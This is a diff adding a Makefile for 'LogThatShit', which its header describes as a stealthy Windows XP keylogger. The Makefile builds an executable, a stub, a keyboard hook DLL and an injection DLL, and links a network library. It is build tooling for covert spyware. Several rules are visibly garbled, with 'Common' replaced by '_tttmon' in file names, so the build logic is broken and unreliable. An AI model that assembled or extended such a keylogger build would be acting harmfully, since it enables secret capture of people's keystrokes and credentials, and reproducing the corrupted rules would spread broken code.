@@ -1,0 +1,108 @@
+# LogThatShit 
+#		A stealthly keylogger designed on and for Windows XP 
+#		By Isam M. <r0cket(NO_SPAM)jump@yahoo.com> 
+#		http://biodegradablegeek.com
+#
+# This software file (the "File") is distributed under the terms of the 
+# GNU General Public License Version 3, (the "License"). You may use, 
+# redistribute and/or modify this File in accordance with the terms and 
+# conditions of the License, a copy of which is available along with the 
+# File in the license.txt file or by writing to 
+# # Free Software Foundation, Inc., 
+# # 59 Temple Place, 
+# # Suite 330, Boston, MA, 02111-1307 
+# # 
+# # or on the Internet at http://www.gnu.org/licenses/gpl.txt.
+#
+# THE FILE IS DISTRIBUTED AS-IS, WITHOUT WARRANTY OF ANY KIND. THE AUTHOR 
+# DOES NOT TAKE ANY RESPONSIBILITY FOR ANY DAMAGE OR LEGAL ISSUES YOU MAY 
+# FACE WHEN USING THIS APPLICATION. PLEASE NOTE THAT LTS WAS WRITTEN AND 
+# RELEASED FOR *EDUCATIONAL* PURPOSES ONLY AND IS NOT INTENDED TO BE USED 
+# FOR ANYTHING THAT MAY BE AGAINST THE LAW WHERE YOU LIVE. IF YOU DO NOT 
+# WANT THAT RESPONSIBILITY, PLEASE DONT COMPILE OR USE THIS APPLICATION.
+#
+# 
+
+CC   = gcc.exe 
+LIBS =  -L"C:/Dev-Cpp/lib" C:\MingW/lib/libwininet.a 
+INCS =  -I"C:/Dev-Cpp/include" 
+DLLWRAP=dllwrap.exe 
+FLAGS = -DWIN32_LEAN_AND_MEAN -W -Wall $(INCS) 
+
+# DEBUG 
+#CFLAGS = $(FLAGS) -DDEBUG_MODE 
+
+# STRICT DEBUG 
+#CFLAGS = $(FLAGS) -ansi -pedantic -DDEBUG_MODE $(INCS) 
+
+# Optimize. Decent size, decent speed. 
+#CFLAGS = $(FLAGS) -O2 
+
+# Build for size 
+#CFLAGS = $(FLAGS) -Os 
+
+# Build for speed 
+CFLAGS = $(FLAGS) -O3 
+
+
+.SILENT:
+
+all: release/LogThatShit.exe release/Stub.lts release/Hook.dll release/Injection.dll 
+	echo All files have been built.
+
+####################################################################
+release/LogThatShit.exe: LogThatShit.o 
+	echo Building LogThatShit.exe 
+	$(CC) LogThatShit.o -o release/LogThatShit.exe $(LIBS) 
+
+LogThatShit.o: LogThatShit.c_tttmon.h 
+	echo Building LogThatShit.o
+	$(CC) $(CFLAGS) -c LogThatShit.c 
+####################################################################
+
+####################################################################
+release/Stub.lts: Stub.o_tttmon.o Settings.o 
+	echo Building Stub.lts 
+	$(CC) Stub.o_tttmon.o Settings.o -o release/Stub.lts $(LIBS) -mwindows 
+
+Stub.o: Stub.c Stub.h_tttmon.h 
+	echo Building Stub.o 
+	$(CC) $(CFLAGS) -c Stub.c 
+####################################################################
+
+####################################################################
+release/Hook.dll: Hook.o_tttmon.o 
+	echo Building Hook.dll 
+	$(DLLWRAP) --output-def fUcker.def --implib fUcker.a Hook.o_tttmon.o $(LIBS) --no-export-all-symbols --add-stdcall-alias -o release/Hook.dll 
+
+Hook.o: Hook.c Hook.h_tttmon.h 
+	echo Building Hook.o 
+	$(CC) $(CFLAGS) -c Hook.c -DBUILDING_DLL=1 
+####################################################################
+
+####################################################################
+release/Injection.dll: Injection.o_tttmon.o Settings.o 
+	echo Building Injection.dll 
+	$(DLLWRAP) --output-def fUcker.def --implib fUcker.a Injection.o_tttmon.o Settings.o $(LIBS) --no-export-all-symbols --add-stdcall-alias -o release/Injection.dll 
+
+Injection.o: Injection.c Injection.h_tttmon.h 
+	echo Building Injection.o 
+	$(CC) $(CFLAGS) -c Injection.c -DBUILDING_DLL=1 
+####################################################################
+
+####################################################################
+Common.o:_tttmon.h_tttmon.c 
+	echo Building_tttmon.o 
+	$(CC) $(CFLAGS) -c_tttmon.c 
+
+Settings.o: Settings.c Settings.h 
+	echo Building Settings.o 
+	$(CC) $(CFLAGS) -c Settings.c -DBUILDING_DLL=1 
+####################################################################
+
+
+.PHONY: all clean 
+clean: 
+	echo Removing object files 
+	rm -f *.o *.a *.def
+
